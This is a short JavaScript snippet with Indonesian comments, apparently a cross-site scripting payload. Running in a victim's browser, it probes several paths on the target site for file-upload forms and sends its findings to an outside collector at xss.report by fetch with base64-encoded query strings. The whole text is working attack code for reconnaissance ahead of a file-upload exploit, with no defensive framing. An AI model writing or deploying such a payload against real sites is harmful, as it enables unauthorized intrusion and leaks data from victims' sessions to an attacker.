(async () => {
    const report = (msg) => fetch('https://xss.report/c/skizaniza?found=' + btoa(msg));
    
    // Kita tahu ada folder /creator/, mari cari file upload di sana
    const subPaths = [
        '/creator/upload',
        '/creator/profile/edit',
        '/creator/save_image.php',
        '/user/setting/avatar'
    ];

    for (let p of subPaths) {
        let res = await fetch(p);
        if (res.status === 200) {
            let html = await res.text();
            // Jika ada form upload, kirimkan detailnya
            if (html.includes('type="file"')) {
                report("Upload form found at: " + p);
            }
        }
    }
})();
